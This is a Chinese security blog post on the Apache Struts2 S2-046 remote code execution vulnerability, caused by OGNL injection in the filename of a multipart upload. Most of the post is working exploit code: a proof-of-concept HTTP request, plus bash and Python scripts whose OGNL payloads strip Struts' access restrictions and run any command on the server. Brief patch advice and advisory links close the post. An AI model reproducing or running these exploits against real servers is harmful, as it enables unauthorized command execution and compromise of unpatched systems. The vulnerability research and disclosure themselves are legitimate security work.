---
title: Struts2-046漏洞
date: 2017-03-21 10:41:05
comments: true
tags: 
- struts2漏洞
- struts2 Poc
categories: web安全
password:
copyright: true
---
<blockquote class="blockquote-center">屋漏偏逢连夜雨，船迟又遇打头风</blockquote>
免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*
　　Apache Struts 2 2.3.32之前的2 2.3.x版本和2.5.10.1之前的2.5.x版本中的Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程任意代码执行，S2-046与S2-045漏洞属于同一类型，不同向量。如果在之前S2-045漏洞曝光后用户已经升级过官方补丁，这次就不受影响。
<!--more -->

### 触发条件
1.上传文件的大小（由Content-Length头指定）大于Struts2允许的最大大小（2GB）。
2.文件名内容构造恶意的OGNL内容。

### S2-046PoC
```bash
POST /doUpload.action HTTP/1.1
Host: localhost:8080
Content-Length: 10000000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
Connection: close
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
Content-Type: text/plain
Kaboom 
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
```
### Exp
#### Sh版
```bash
#!/bin/bash

url=$1
cmd=$2
shift
shift

boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
```
sh exploit-cd.sh http://xxx.com/action "whoami"

#### Python版
```bash
__author__ = 'hackteam.cn'
import pycurl
import StringIO
import urllib
def tt(url,data):
    sio = StringIO.StringIO()
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url)
    c.setopt(pycurl.REFERER, url)
    c.setopt(pycurl.HTTPHEADER, ['Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150', 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'])
    c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_0)
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.POSTFIELDS, data)
    c.setopt(pycurl.CONNECTTIMEOUT, 300)
    c.setopt(pycurl.TIMEOUT, 300)
    c.setopt(pycurl.WRITEFUNCTION, sio.write)
    try:
        c.perform()
    except Exception, ex:
        pass
    c.close()
    resp = sio.getvalue()
    sio.close()
    return resp

data="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"
print tt('https://xxx.action',data)
```
### 修复建议
1. 严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。
2. 如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）

### 官网公告
https://cwiki.apache.org/confluence/display/WW/S2-045
https://cwiki.apache.org/confluence/display/WW/S2-046


### 补丁地址
Struts 2.3.32：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32 
Struts 2.5.10.1：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1 


### 参考
http://struts.apache.org/docs/s2-045.html
http://struts.apache.org/docs/s2-046.html
https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723


### 传送门
[struts2-052漏洞](http://thief.one/2017/09/06/1)
[struts2-046漏洞](http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/)
[struts2_045漏洞](http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/)
[struts2漏洞poc汇总](http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/)